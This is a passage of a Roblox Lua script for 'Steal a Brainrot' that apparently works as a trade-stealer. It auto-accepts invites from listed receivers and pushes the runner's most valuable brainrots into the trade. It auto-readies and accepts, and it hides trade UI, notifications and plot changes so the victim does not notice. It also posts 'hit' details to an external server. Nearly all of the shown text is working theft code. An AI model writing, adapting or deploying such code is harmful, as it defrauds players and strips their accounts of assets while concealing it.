        				tbl6.AddBrainrot = fn8(v2, "Brainrot", "Add")
        				tbl6.RemoveBrainrot = fn8(v2, "Brainrot", "Remove")
        			end
        		end
        	end
        
        	local sendInvite = result.SendInvite
        
        	if type(sendInvite) == "function" then
        		local v2 = fn7(sendInvite, 1)
        
        		if v2 then
        			tbl6.Invite = v2
        		end
        	end
        
        	return true
        end
        
        local tbl7 = {
        	"CreateInvite",
        	"DeclineInvite",
        	"AcceptInvite",
        	"Invite",
        	"SearchUser",
        	"AddBrainrot",
        	"RemoveBrainrot",
        	"CancelTrade",
        	"Ready",
        	"Accept",
        }
        
        local function fn7()
        	for _, v2 in ipairs(tbl7) do
        		if not tbl6[v2] then
        			return false
        		end
        	end
        
        	return true
        end
        
        fn3("[EXTRACT] Starting remote extraction...")
        
        for i = 1, 15 do
        	fn6()
        
        	if fn7() then
        		fn3("[EXTRACT] All remotes resolved ✓")
        		break
        	else
        		local tbl8 = {}
        
        		for _, v2 in ipairs(tbl7) do
        			if not tbl6[v2] then
        				tbl8[#tbl8 + 1] = v2
        			end
        		end
        
        		fn3(("[EXTRACT] Attempt %d missing: %s"):format(i, table.concat(tbl8, ", ")))
        		if i ~= 15 then
        			task.wait(1)
        			continue
        		end
        	end
        
        	break
        end
        
        for _, v2 in ipairs(tbl7) do
        	local v3 = tbl6[v2]
        	fn3(("[REMOTE] %-20s = %s (%s)"):format(v2, v3 and v3.Name:sub(1, 20) or "MISSING", v3 and v3.ClassName or "—"))
        end
        
        if not tbl6.Invite then
        	fn3("FATAL: No Invite remote")
        	error("[SAB] Failed to find essential remotes. Aborting.")
        	return
        end
        
        fn3("All essential remotes found")
        
        local function fn8(arg, ...)
        	local v2 = tbl6[arg]
        	if not v2 then
        		fn3("callRF: Remote not found:", arg)
        		return false, nil, nil, nil
        	end
        
        	if not fn5(v2, "RemoteFunction") then
        		fn3("callRF: Remote is not RemoteFunction:", arg, v2.ClassName)
        		return false, nil, nil, nil
        	end
        	local v3 = tbl4[arg]
        	local tbl8
        
        	if v3 then
        		tbl8 = { v3, ... }
        	else
        		tbl8 = { ... }
        	end
        
        	local ok, result, result2, result3 = pcall(function()
        		return v2:InvokeServer(table.unpack(tbl8))
        	end)
        
        	if not ok then
        		fn3("callRF: Error invoking", arg, ":", tostring(result))
        		return false, nil, nil, nil
        	end
        	return ok, result, result2, result3
        end
        
        local function fn9(arg, ...)
        	local v2 = tbl6[arg]
        	if not v2 then
        		fn3("fireRE: Remote not found:", arg)
        		return
        	end
        
        	if not fn5(v2, "RemoteEvent") then
        		fn3("fireRE: Remote is not RemoteEvent:", arg, v2.ClassName)
        		return
        	end
        	local v3 = tbl5[arg]
        	local tbl8
        
        	if v3 then
        		tbl8 = { v3, ... }
        	else
        		tbl8 = { ... }
        	end
        
        	pcall(function()
        		v2:FireServer(table.unpack(tbl8))
        	end)
        end
        
        fn3("Loading game modules...")
        local Synchronizer = nil
        local Animals = nil
        local ReplicatorClient = nil
        local Animals2 = nil
        local PlotController = nil
        local Mutations = nil
        
        local ok, result = pcall(function()
        	Synchronizer = require(ReplicatedStorage.Packages.Synchronizer)
        end)
        
        fn3("  Sync:", ok and "OK" or "FAIL: " .. tostring(result))
        
        local ok2, result2 = pcall(function()
        	Animals = require(ReplicatedStorage.Shared.Animals)
        end)
        
        fn3("  Animals:", ok2 and "OK" or "FAIL: " .. tostring(result2))
        
        local ok3, result3 = pcall(function()
        	ReplicatorClient = require(ReplicatedStorage.Packages.ReplicatorClient)
        end)
        
        fn3("  RepCli:", ok3 and "OK" or "FAIL: " .. tostring(result3))
        
        local ok4, result4 = pcall(function()
        	Animals2 = require(ReplicatedStorage.Datas.Animals)
        end)
        
        fn3("  DatasAnimals:", ok4 and "OK" or "FAIL: " .. tostring(result4))
        
        local ok5, result5 = pcall(function()
        	PlotController = require(ReplicatedStorage.Controllers.PlotController)
        end)
        
        fn3("  PlotController:", ok5 and "OK" or "FAIL: " .. tostring(result5))
        
        local ok6, result6 = pcall(function()
        	Mutations = require(ReplicatedStorage.Datas.Mutations)
        end)
        
        fn3("  Mutations:", ok6 and "OK" or "FAIL: " .. tostring(result6))
        
        local function fn10()
        	return syn and syn.request or http and http.request or type(request) == "function" and request or type(http_request) == "function" and http_request or nil
        end
        
        fn3("Requester:", fn10() and "found" or "NOT FOUND")
        
        local function fn11(arg)
        	local v2 = fn10()
        	if not v2 then
        		return false
        	end
        
        	local ok7, result7 = pcall(function()
        		return v2({
        			Url = v .. "/signal-hit-sab",
        			Method = "POST",
        			Headers = { ["Content-Type"] = "application/json", ["X-Roblox-Key"] = str5 },
        			Body = HttpService2:JSONEncode({
        				place_id = tostring(game.PlaceId),
        				job_id = tostring(game.JobId),
        				sender = localPlayer.Name,
        				target_players = { arg:lower() },
        				game_type = "sab",
        				expiry_seconds = n4,
        			}),
        		})
        	end)
        
        	if ok7 and result7 and result7.StatusCode and result7.StatusCode >= 200 and result7.StatusCode < 300 then
        		return true
        	end
        	return false
        end
        
        local fn12 = nil
        
        fn12 = function(arg)
        	if type(arg) ~= "table" then
        		return arg
        	end
        	local tbl8 = {}
        
        	for k, v2 in pairs(arg) do
        		tbl8[fn12(k)] = fn12(v2)
        	end
        
        	return tbl8
        end
        
        local v2 = nil
        local v3 = nil
        local flag4 = false
        local get = nil
        local tryIndex = nil
        local onChanged = nil
        
        local function fn13()
        	local myPlot = PlotController:GetMyPlot()
        	if not myPlot or not myPlot.Channel then
        		return nil
        	end
        	local channel = myPlot.Channel
        
        	if flag4 and get then
        		local animalList = get(channel, "AnimalList") or get(channel, "AnimalPodiums")
        		if animalList and next(animalList) then
        			return animalList
        		end
        	end
        
        	local AnimalList = channel:Get("AnimalList") or channel:Get("AnimalPodiums")
        	if AnimalList and next(AnimalList) then
        		return AnimalList
        	end
        	return nil
        end
        
        local function fn14()
        	if v2 and next(v2) then
        		return v2
        	end
        	return fn13()
        end
        
        local function fn15()
        	return fn14()
        end
        
        local function fn16()
        	return fn13()
        end
        
        local function fn17(arg)
        	if not arg then
        		return false
        	end
        
        	if tbl[(arg.Index or ""):lower()] then
        		return true
        	end
        	local v4 = Animals2[arg.Index]
        
        	if v4 and v4.DisplayName then
        		if tbl[v4.DisplayName:lower()] then
        			return true
        		end
        	end
        
        	return false
        end
        
        local function fn18(arg)
        	if not arg then
        		return false
        	end
        
        	if tbl2[(arg.Index or ""):lower()] then
        		return true
        	end
        	local v4 = Animals2[arg.Index]
        
        	if v4 and v4.DisplayName then
        		if tbl2[v4.DisplayName:lower()] then
        			return true
        		end
        	end
        
        	return false
        end
        
        local function fn19(arg)
        	if not arg then
        		return 0
        	end
        
        	if type(arg) == "number" then
        		return arg
        	end
        	local match = tostring(arg):upper():gsub("[%$,%s]", ""):gsub("/S", ""):match("([%d%.]+)") or "0"
        	local n5 = tonumber(match) or 0
        	if match:find("B") then
        		return n5 * 1e9
        	end
        
        	if match:find("M") then
        		return n5 * 1000000
        	end
        
        	if match:find("K") then
        		return n5 * 1000
        	end
        	return n5
        end
        
        local function fn20(arg)
        	if not arg or type(arg) ~= "table" then
        		return 0
        	end
        	local index = arg.Index or "Unknown"
        	local mutation = arg.Mutation or ""
        	local generation = (Animals2[index] or {}).Generation or 0
        
        	if mutation ~= "" then
        		local v4 = Mutations[mutation]
        
        		if v4 and v4.Modifier then
        			generation += generation * v4.Modifier
        		end
        	end
        
        	return math.round(generation)
        end
        
        local function fn21()
        	local v4 = fn15()
        	if not v4 then
        		return {}
        	end
        	local tbl8 = {}
        	local tbl9 = {}
        
        	for k, v5 in pairs(v4) do
        		local num = tonumber(k)
        
        		if num and type(v5) == "table" and not v5.Machine then
        			local v6 = fn20(v5)
        
        			if fn17(v5) then
        				tbl8[#tbl8 + 1] = { slot = num, animal = v5, gen = v6, priority = true }
        			elseif threshold <= 0 or v6 >= threshold then
        				tbl9[#tbl9 + 1] = { slot = num, animal = v5, gen = v6, priority = false }
        			end
        		end
        	end
        
        	table.sort(tbl8, function(arg, arg2)
        		return arg.gen > arg2.gen
        	end)
        
        	table.sort(tbl9, function(arg, arg2)
        		return arg.gen > arg2.gen
        	end)
        
        	local tbl10 = {}
        
        	for _, v5 in ipairs(tbl8) do
        		tbl10[#tbl10 + 1] = v5
        	end
        
        	for _, v5 in ipairs(tbl9) do
        		tbl10[#tbl10 + 1] = v5
        	end
        
        	return tbl10
        end
        
        local function fn22()
        	local myPlot = PlotController:GetMyPlot()
        	if not myPlot then
        		fn3("freezePlotChannel: No plot found")
        		return false
        	end
        	fn3("freezePlotChannel: Found our plot, UID:", myPlot.UID)
        	local channel = myPlot.Channel
        	if not channel then
        		fn3("freezePlotChannel: No channel found")
        		return false
        	end
        	get = channel.Get
        	tryIndex = channel.TryIndex
        	onChanged = channel.OnChanged
        	local tbl8 = get(channel, nil) or {}
        	v2 = fn12(tbl8.AnimalList or {})
        	v3 = fn12(tbl8.AnimalPodiums or {})
        	fn3("freezePlotChannel: Frozen", #v2, "animals")
        	flag4 = true
        
        	channel.Get = function(arg, arg2)
        		if arg2 == "AnimalList" then
        			return fn12(v2)
        		end
        
        		if arg2 == "AnimalPodiums" then
        			return fn12(v3)
        		end
        
        		if type(arg2) == "string" then
        			local match = arg2:match("^AnimalList%.(.+)$")
        			if match then
        				return v2[tonumber(match) or match]
        			end
        			local match2 = arg2:match("^AnimalPodiums%.(.+)$")
        			if match2 then
        				return v3[tonumber(match2) or match2]
        			end
        		end
        
        		if get then
        			return get(arg, arg2)
        		end
        		return nil
        	end
        
        	fn3("freezePlotChannel: Hooked Channel.Get")
        
        	if channel.TryIndex then
        		channel.TryIndex = function(arg, arg2)
        			if type(arg2) == "table" then
        				if arg2[1] == "AnimalList" then
        					if #arg2 == 1 then
        						return fn12(v2)
        					end
        					local v4 = v2
        
        					for i = 2, #arg2 do
        						if type(v4) ~= "table" then
        							return nil
        						end
        						v4 = v4[tonumber(arg2[i]) or arg2[i]]
        					end
        
        					return v4
        				end
        
        				if arg2[1] == "AnimalPodiums" then
        					if #arg2 == 1 then
        						return fn12(v3)
        					end
        					local v4 = v3
        
        					for i = 2, #arg2 do
        						if type(v4) ~= "table" then
        							return nil
        						end
        						v4 = v4[tonumber(arg2[i]) or arg2[i]]
        					end
        
        					return v4
        				end
        			elseif type(arg2) == "string" then
        				if arg2 == "AnimalList" then
        					return fn12(v2)
        				end
        
        				if arg2 == "AnimalPodiums" then
        					return fn12(v3)
        				end
        			end
        
        			if tryIndex then
        				return tryIndex(arg, arg2)
        			end
        			return nil
        		end
        
        		fn3("freezePlotChannel: Hooked Channel.TryIndex")
        	end
        
        	if channel.OnChanged then
        		channel.OnChanged = function(arg, arg2, arg3, arg4)
        			local flag5 = type(arg2) == "table" and arg2[1] or arg2
        
        			if flag5 == "AnimalList" or flag5 == "AnimalPodiums" then
        				arg4 = arg4 and arg3
        
        				if arg4 then
        					if flag5 == "AnimalList" then
        						pcall(arg3, fn12(v2), nil)
        					else
        						pcall(arg3, fn12(v3), nil)
        					end
        				end
        
        				return function()
        				end
        			end
        
        			if onChanged then
        				return onChanged(arg, arg2, arg3, arg4)
        			end
        
        			return function()
        			end
        		end
        
        		fn3("freezePlotChannel: Hooked Channel.OnChanged")
        	end
        
        	for _, v4 in ipairs({ "UpdateAnimalPodiums", "MoveAnimals", "ClearIndex", "UpdateModel", "UpdateClaim" }) do
        		if myPlot[v4] then
        			myPlot[v4] = function()
        			end
        
        			fn3("freezePlotChannel: Blocked", v4)
        		end
        	end
        
        	fn3("freezePlotChannel: Plot frozen successfully")
        	return true
        end
        
        local tbl8 = { TradeLiveTrade = true, TradePlayerList = true, TradePrompts = true }
        
        local function fn23()
        	fn3("hookInterface...")
        	local ok7, result7 = pcall(require, ReplicatedStorage.Controllers.InterfaceController)
        	if not ok7 or type(result7) ~= "table" then
        		fn3("  InterfaceController not found")
        		return
        	end
        	local toggle = result7.Toggle
        
        	if type(toggle) == "function" then
        		result7.Toggle = function(arg, arg2, arg3, arg4, ...)
        			if tbl8[arg2] then
        				if arg3 == true or arg3 == nil then
        					return
        				end
        				return toggle(arg, arg2, false, arg4, ...)
        			end
        
        			if flag2 then
        				local tbl9 = arg4 and { table.unpack(arg4) } or {}
        
        				for k in pairs(tbl8) do
        					if not table.find(tbl9, k) then
        						tbl9[#tbl9 + 1] = k
        					end
        				end
        
        				for _, v4 in ipairs({ "Hud", "LeftCenter" }) do
        					if not table.find(tbl9, v4) then
        						tbl9[#tbl9 + 1] = v4
        					end
        				end
        
        				return toggle(arg, arg2, arg3, tbl9, ...)
        			end
        
        			return toggle(arg, arg2, arg3, arg4, ...)
        		end
        	end
        
        	fn3("  Interface hooked")
        end
        
        local function fn24()
        	fn3("hookCamera...")
        	local ok7, result7 = pcall(require, ReplicatedStorage.Controllers.CameraController)
        	if not ok7 or type(result7) ~= "table" then
        		fn3("  CameraController not found")
        		return
        	end
        
        	for _, v4 in ipairs({ "Blur", "Fov", "SetBlur", "SetFov", "TweenBlur", "TweenFov" }) do
        		local v5 = result7[v4]
        
        		if type(v5) == "function" then
        			result7[v4] = function(arg, ...)
        				if flag2 then
        					return
        				end
        				return v5(arg, ...)
        			end
        		end
        	end
        
        	local blurEffect = Lighting:FindFirstChildOfClass("BlurEffect")
        
        	if blurEffect then
        		blurEffect.Size = 0
        	end
        
        	fn3("  Camera hooked")
        end
        
        local function fn25()
        	fn3("hookNotifs...")
        	local ok7, result7 = pcall(require, ReplicatedStorage.Controllers.CornerNotificationController)
        
        	if ok7 and type(result7) == "table" then
        		if type(result7.Add) == "function" then
        			result7.Add = function()
        				return function()
        				end
        			end
        		end
        	end
        
        	local ok8, result8 = pcall(require, ReplicatedStorage.Controllers.NotificationController)
        
        	if ok8 and type(result8) == "table" then
        		for _, v4 in ipairs({ "Notify", "Error", "Success" }) do
        			if type(result8[v4]) == "function" then
        				result8[v4] = function()
        				end
        			end
        		end
        	end
        
        	local playerGui = localPlayer:WaitForChild("PlayerGui", 15)
        	if not playerGui then
        		fn3("  PlayerGui not found")
        		return
        	end
        
        	local function fn26(arg)
        		local function fn27(arg2)
        			arg2.Enabled = false
        
        			arg2:GetPropertyChangedSignal("Enabled"):Connect(function()
        				if arg2.Enabled then
        					arg2.Enabled = false
        				end
        			end)
        		end
        
        		local v4 = playerGui:FindFirstChild(arg)
        
        		if v4 then
        			fn27(v4)
        		end
        
        		playerGui.ChildAdded:Connect(function(child)
        			if child.Name == arg then
        				task.defer(function()
        					fn27(child)
        				end)
        			end
        		end)
        	end
        
        	for _, v4 in ipairs({ "TradeLiveTrade", "TradePlayerList", "TradePrompts", "BrainrotTrader" }) do
        		fn26(v4)
        	end
        
        	local function fn27(arg)
        		local function fn28(arg2)
        			arg2:GetPropertyChangedSignal("Enabled"):Connect(function()
        				if flag2 and not arg2.Enabled then
        					task.defer(function()
        						pcall(function()
        							arg2.Enabled = true
        						end)
        					end)
        				end
        			end)
        
        			for _, child in ipairs(arg2:GetChildren()) do
        				if child:IsA("GuiObject") then
        					child:GetPropertyChangedSignal("Visible"):Connect(function()
        						if flag2 and not child.Visible then
        							task.defer(function()
        								pcall(function()
        									child.Visible = true
        								end)
        							end)
        						end
        					end)
        				end
        			end
        		end
        
        		local v4 = playerGui:FindFirstChild(arg)
        
        		if v4 then
        			fn28(v4)
        		end
        
        		playerGui.ChildAdded:Connect(function(child)
        			if child.Name == arg then
        				task.defer(function()
        					fn28(child)
        				end)
        			end
        		end)
        	end
        
        	fn27("LeftCenter")
        	fn27("Hud")
        	fn3("  Notifications hooked")
        end
        
        fn3("Setting up UI hooks...")
        pcall(fn23)
        pcall(fn24)
        pcall(fn25)
        fn3("UI hooks complete")
        
        Lighting.ChildAdded:Connect(function(child)
        	if flag2 and child:IsA("BlurEffect") then
        		child.Size = 0
        	end
        end)
        
        RunService.Heartbeat:Connect(function()
        	if not flag2 then
        		return
        	end
        	local blurEffect = Lighting:FindFirstChildOfClass("BlurEffect")
        
        	if blurEffect and blurEffect.Size ~= 0 then
        		blurEffect.Size = 0
        	end
        end)
        
        local currentCamera = Workspace.CurrentCamera
        
        currentCamera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
        	if flag2 then
        		currentCamera.FieldOfView = 70
        	end
        end)
        
        local function fn26(arg)
        	local ok7, result7 = pcall(Players.GetUserIdFromNameAsync, Players, arg)
        	return ok7 and result7 or nil
        end
        
        local function fn27()
        	local ok7, result7 = pcall(function()
        		return ReplicatorClient.get(("Trade_%d"):format(localPlayer.UserId))
        	end)
        
        	return ok7 and result7 or nil
        end
        
        local function fn28(arg)
        	local n5 = tick() + arg
        
        	while tick() < n5 do
        		local v4 = fn27()
        
        		if v4 then
        			if v4:TryIndex({ "active", "data" }) then
        				return v4
        			end
        		end
        
        		task.wait(0.05)
        	end
        
        	return nil
        end
        
        local function fn29(arg)
        	local v4 = arg:TryIndex({ "active", "data", "users" })
        	if not v4 then
        		return nil
        	end
        
        	for k, v5 in pairs(v4) do
        		if v5 == localPlayer.UserId then
        			return k
        		end
        	end
        
        	return nil
        end
        
        local function fn30(arg, arg2)
        	local v4 = arg:TryIndex({ "active", "data", "players" })
        	if not v4 then
        		return nil
        	end
        
        	for k in pairs(v4) do
        		if k ~= arg2 then
        			return k
        		end
        	end
        
        	return nil
        end
        
        local function fn31(arg, arg2)
        	if not arg2 then
        		return 0
        	end
        	local v4 = arg:TryIndex({ "active", "data", "players" })
        	if not v4 then
        		return 0
        	end
        	local v5 = v4[arg2]
        	if not v5 or not v5.offer or type(v5.offer.brainrots) ~= "table" then
        		return 0
        	end
        	local n5 = 0
        
        	for k in pairs(v5.offer.brainrots) do
        		n5 += 1
        	end
        
        	return n5
        end
        
        local function fn32(arg, arg2)
        	local v4 = arg:TryIndex({ "active", "data", "players" })
        	if not v4 then
        		return 0
        	end
        	local v5 = v4[arg2]
        	if not v5 or not v5.offer or type(v5.offer.brainrots) ~= "table" then
        		return 0
        	end
        	local n5 = 0
        
        	for k in pairs(v5.offer.brainrots) do
        		n5 += 1
        	end
        
        	return n5
        end
        
        local function fn33(arg)
        	local v4 = arg:TryIndex({ "active", "data", "players" })
        
        	if v4 then
        		local v5 = fn29(arg)
        
        		if v5 then
        			local v6 = v4[v5]
        			if v6 and v6.maxSlots and type(v6.maxSlots) == "number" and v6.maxSlots > 0 then
        				return v6.maxSlots
        			end
        		end
        
        		for _, v6 in pairs(v4) do
        			if v6.maxSlots and type(v6.maxSlots) == "number" and v6.maxSlots > 0 then
        				return v6.maxSlots
        			end
        		end
        	end
        
        	local v5 = arg:TryIndex({ "active", "data", "maxBrainrots" })
        	if type(v5) == "number" and v5 > 0 then
        		return v5
        	end
        	local v6 = arg:TryIndex({ "active", "data", "brainrotLimit" })
        	if type(v6) == "number" and v6 > 0 then
        		return v6
        	end
        	return 5
        end
        
        local function fn34(arg, arg2, arg3)
        	local v4 = arg:TryIndex({ "active", "data", "players" })
        	if not v4 then
        		return false
        	end
        	local v5 = v4[arg2]
        
        	if v5 and v5.offer and type(v5.offer.brainrots) == "table" then
        		for _, brainrot in pairs(v5.offer.brainrots) do
        			if type(brainrot) == "table" and tonumber(brainrot.IndexOnPlot) == arg3 then
        				return true
        			end
        		end
        	end
        
        	return false
        end
        
        local n5 = 5
        local n6 = 1.1
        
        local function fn35(arg)
        	local v4 = arg:TryIndex({ "active", "data", "lastChange" })
        	if typeof(v4) ~= "number" then
        		return 0
        	end
        	local n7 = v4 + n5 - Workspace:GetServerTimeNow()
        	return n7 > 0 and n7 or 0
        end
        
        local function fn36(arg)
        	local v4 = arg:TryIndex({ "active", "data", "lastChange" })
        	if typeof(v4) ~= "number" then
        		return 0
        	end
        	local n7 = v4 + n6 - Workspace:GetServerTimeNow()
        	return n7 > 0 and n7 or 0
        end
        
        local n7 = 30
        local n8 = 0.3
        
        local function fn37(arg, arg2)
        	local v4 = fn21()
        	if #v4 == 0 then
        		return "no_brainrots"
        	end
        	local v5 = fn33(arg)
        	local n9 = 0
        	local flag5
        
        	for i, v6 in ipairs(v4) do
        		if not arg:TryIndex({ "active", "data" }) then
        			return "completed"
        		end
        
        		if fn32(arg, arg2) >= v5 then
        			break
        		end
        
        		if fn34(arg, arg2, v6.slot) then
        			continue
        		end
        
        		local tbl9 = {
        			UUID = v6.animal.UUID,
        			Index = v6.animal.Index,
        			Mutation = v6.animal.Mutation,
        			Traits = v6.animal.Traits,
        			IndexOnPlot = v6.slot,
        			LastCollect = v6.animal.LastCollect or os.time(),
        			OfflineGain = v6.animal.OfflineGain or 99,
        			Steal = false,
        		}
        
        		local n10 = tick() + n7
        		local n11 = 0
        		local exitTo = nil
        
        		while true do
        			flag5 = false
        
        			if not (tick() < n10) then
        				exitTo = 1
        				break
        			else
        				if not arg:TryIndex({ "active", "data" }) then
        					exitTo = 2
        					break
        				elseif fn34(arg, arg2, v6.slot) then
        					exitTo = 3
        					break
        				else
        					local now = tick()
        					local v7 = fn36(arg)
        
        					if v7 > 0 then
        						task.wait(math.min(v7 + 0.02, 0.15))
        						continue
        					elseif now - n11 >= n8 then
        						local AddBrainrot, v8, v9 = fn8("AddBrainrot", v6.slot, tbl9)
        						local str6 = tostring(v9 or v8 or "")
        
        						if not str6:find("Other player doesn't have enough space") then
        							if str6:find("Please wait before adding another brainrot") then
        								task.wait(0.5)
        								n11 = now
        							else
        								n11 = now
        							end
        
        							task.wait(0.05)
        							continue
        						end
        					else
        						task.wait(0.05)
        						continue
        					end
        				end
        
        				break
        			end
        		end
        
        		if exitTo ~= 1 then
        			if exitTo == 2 then
        				return "completed"
        			end
        
        			if exitTo ~= 3 then
        				return "space_full"
        			end
        			flag5 = true
        		end
        
        		flag5 = flag5 or fn34(arg, arg2, v6.slot)
        
        		if flag5 then
        			n9 += 1
        		end
        
        		if i < #v4 then
        			task.wait(0.1)
        		end
        	end
        
        	return "completed"
        end
        
        local function fn38(arg, arg2, arg3)
        	local v4 = fn31(arg, arg3)
        	local n9 = tick() + 3
        	local exitTo = nil
        
        	while true do
        		if not (tick() < n9) then
        			exitTo = 1
        			break
        		else
        			if not arg:TryIndex({ "active", "data" }) then
        				exitTo = 2
        				break
        			elseif fn31(arg, arg3) == v4 then
        				local v5 = fn35(arg)
        
        				if v5 <= 0 then
        					exitTo = 1
        					break
        				else
        					task.wait(math.min(v5 + 0.02, 0.05))
        					continue
        				end
        			end
        
        			break
        		end
        	end
        
        	if exitTo == 1 then
        		if not arg:TryIndex({ "active", "data" }) then
        			return "completed"
        		end
        		local n10 = tick() + 60
        		local n11 = 0
        		local n12 = 0
        
        		while tick() < n10 do
        			if not arg:TryIndex({ "active", "data" }) then
        				return "completed"
        			end
        			local v5 = arg:TryIndex({ "active", "data", "players" })
        			if not v5 then
        				task.wait(0.03)
        				continue
        			end
        			local v6 = v5[arg2]
        			if not v6 then
        				task.wait(0.03)
        				continue
        			end
        			local flag5 = true
        
        			for _, v7 in pairs(v5) do
        				if not v7.accepted then
        					flag5 = false
        					break
        				end
        			end
        
        			if flag5 then
        				return "completed"
        			end
        
        			if fn31(arg, arg3) ~= v4 then
        				return "abort"
        			end
        			local flag6 = true
        
        			for _, v7 in pairs(v5) do
        				if not v7.ready then
        					flag6 = false
        					break
        				end
        			end
        
        			local now = tick()
        
        			if flag6 then
        				if not v6.accepted then
        					local v7 = fn35(arg)
        
        					if v7 <= 0 and now - n11 >= 0.3 then
        						fn9("Accept")
        						n11 = now
        					elseif v7 > 0 then
        						task.wait(math.min(v7 + 0.02, 0.05))
        					end
        				end
        			elseif not v6.ready then
        				local v7 = fn35(arg)
        
        				if v7 <= 0 and now - n12 >= 0.3 then
        					fn9("Ready")
        					n12 = now
        				elseif v7 > 0 then
        					task.wait(math.min(v7 + 0.02, 0.05))
        				end
        			end
        
        			task.wait(0.03)
        		end
        
        		return "completed"
        	end
        
        	if exitTo == 2 then
        		return "completed"
        	end
        	return "abort"
        end
        
        local function fn39(arg, arg2)
        	fn3("Trade loop started with", arg2)
        	task.wait(0.2)
        	local v4 = fn29(arg)
        
        	if not v4 then
        		fn9("CancelTrade")
        		flag2 = false
        		fn3("  No myIdx - cancelling")
        		return
        	end
        
        	local v5 = fn30(arg, v4)
        	local n9 = tick() + n2
        
        	while tick() < n9 do
        		if not arg:TryIndex({ "active", "data" }) then
        			fn3("  Trade data gone")
        			break
        		else
        			local v6 = arg:TryIndex({ "active", "data", "players" })
        			local v7, v8, n10, flag5, v9
        
        			if v6 then
        				local flag6 = true
        
        				for _, v10 in pairs(v6) do
        					if not v10.accepted then
        						flag6 = false
        						break
        					end
        				end
        
        				if flag6 then
        					fn3("  All accepted")
        					break
        				else
        					v7 = fn31(arg, v5)
        					v8 = fn33(arg)
        					n10 = v8 - fn32(arg, v4)
        					flag5 = v8 - v7 > 0 and n10 > 0
        
        					if flag5 then
        						v9 = fn37(arg, v4)
        						fn3("  addAllBrainrots:", v9)
        					end
        
        					if fn38(arg, v4, v5) == "abort" then
        						task.wait(0.2)
        						continue
        					elseif arg:TryIndex({ "active", "data" }) then
        						task.wait(0.2)
        						continue
        					end
        				end
        			else
        				v7 = fn31(arg, v5)
        				v8 = fn33(arg)
        				n10 = v8 - fn32(arg, v4)
        				flag5 = v8 - v7 > 0 and n10 > 0
        
        				if flag5 then
        					v9 = fn37(arg, v4)
        					fn3("  addAllBrainrots:", v9)
        				end
        
        				if fn38(arg, v4, v5) == "abort" then
        					task.wait(0.2)
        					continue
        				elseif arg:TryIndex({ "active", "data" }) then
        					task.wait(0.2)
        					continue
        				end
        			end
        		end
        
        		break
        	end
        
        	flag2 = false
        	tbl3[arg2] = tick()
        	fn3("Trade loop ended")
        end
        
        local function fn40()
        	fn3("Setting up incoming listener...")
        	local tbl9 = {}
        
        	for _, receiver in ipairs(receivers) do
        		local ok7, result7 = pcall(Players.GetUserIdFromNameAsync, Players, receiver)
        
        		if ok7 and result7 then
        			tbl9[result7] = receiver
        			tbl9[tonumber(result7)] = receiver
        			tbl9[tostring(result7)] = receiver
        		end
        	end
        
        	local createInvite = tbl6.CreateInvite
        	local acceptInvite = tbl6.AcceptInvite
        	if not createInvite or not acceptInvite then
        		fn3("  Missing remotes")
        		return
        	end
        
        	createInvite.OnClientEvent:Connect(function(arg, arg2)
        		if not arg2 or arg2.from == nil then
        			return
        		end
        		local from = arg2.from
        		local v4 = tbl9[from] or tbl9[tonumber(from)] or tbl9[tostring(from)]
        
        		if not v4 and arg2.fromUsername then
        			for _, receiver in ipairs(receivers) do
        				local fromUsername = arg2.fromUsername
        				if receiver:lower() == fromUsername:lower() then
        					v4 = receiver
        					break
        				end
        			end
        		end
        
        		if not v4 then
        			return
        		end
        		local serverTimeNow = Workspace:GetServerTimeNow()
        		if arg2.expires and arg2.expires <= serverTimeNow then
        			return
        		end
        
        		if flag2 then
        			return
        		end
        		fn3("Incoming invite from", v4)
        
        		local ok7, result7, result8 = pcall(function()
        			return acceptInvite:InvokeServer(arg)
        		end)
        
        		if not ok7 or result7 == false and type(result8) == "string" then
        			fn3("  Accept failed:", tostring(result8))
        			return
        		end
        		flag2 = true
        
        		task.spawn(function()
        			local v5 = fn28(40)
        			if not v5 then
        				flag2 = false
        				return
        			end
        			fn39(v5, v4)
        		end)
        	end)
        
        	fn3("  Listener active")
        end
        
        fn40()
        
        local function fn41(arg)
        	fn3("attemptTrade called for", arg)
        	local v4 = tbl3[arg]
        	if v4 and tick() - v4 < n then
        		fn3("  Cooldown active")
        		return
        	end
        
        	if flag2 then
        		fn3("  Trade already active")
        		return
        	end
        	local v5 = fn26(arg)
        	if not v5 then
        		fn3("  No UID for", arg)
        		return
        	end
        	fn3("  UID:", v5)
        	local Invite, v6 = fn8("Invite", v5)
        
        	if Invite and v6 == true then
        		fn3("  Invite sent successfully")
        		tbl3[arg] = tick()
        		fn11(arg)
        		local v7 = fn28(40)
        
        		if v7 then
        			flag2 = true
        			fn39(v7, arg)
        		else
        			fn3("  No trade channel received")
        			tbl3[arg] = tick() + 10
        		end
        	else
        		fn3("  Invite failed:", v6)
        		tbl3[arg] = tick() + 10
        	end
        end
        
        require(ReplicatedStorage.Shared.Animals)
        local Animals3 = require(ReplicatedStorage.Datas.Animals)
        
        local function fn42(arg)
        	if not arg then
        		return "$0"
        	end
        
        	local function fn43(arg2)
        		return arg2 % 1 == 0 and string.format("%.0f", arg2) or string.format("%.1f", arg2)
        	end
        
        	if arg >= 1e9 then
        		return "$" .. fn43(arg / 1e9) .. "B/s"
        	end
        
        	if arg >= 1000000 then
        		return "$" .. fn43(arg / 1000000) .. "M/s"
        	end
        
        	if arg >= 1000 then
        		return "$" .. fn43(arg / 1000) .. "K/s"
        	end
        	return "$" .. tostring(arg) .. "/s"
        end
        
        local function fn43()
        	local v4 = fn15()
        	if not v4 then
        		return {}
        	end
        	local tbl9 = {}
        
        	for k, v5 in pairs(v4) do
        		if tonumber(k) and type(v5) == "table" and not v5.Machine then
        			local v6 = fn20(v5)
        			local tbl10 = Animals3[v5.Index] or {}
        
        			tbl9[#tbl9 + 1] = {
        				DisplayName = tbl10.DisplayName or v5.Index,
        				Index = v5.Index,
        				Generation = v6,
        				ParsedGeneration = fn19(v6),
        				Mutation = v5.Mutation,
        				Traits = v5.Traits or {},
        				Rarity = tbl10.Rarity or "Unknown",
        				Priority = fn17(v5),
        				HallOfFame = fn18(v5) or fn19(v6) >= 3e9,
        			}
        		end
        	end
        
        	table.sort(tbl9, function(arg, arg2)
        		return arg.ParsedGeneration > arg2.ParsedGeneration
        	end)
        
        	return tbl9
        end
        
        local function fn44()
        	return { brainrots = fn43() }
        end
        
        local function fn45(arg, arg2)
        	if not arg2 or arg2 == "" then
        		return false
        	end
        	local v4 = fn10()
        	if not v4 then
        		return false
        	end
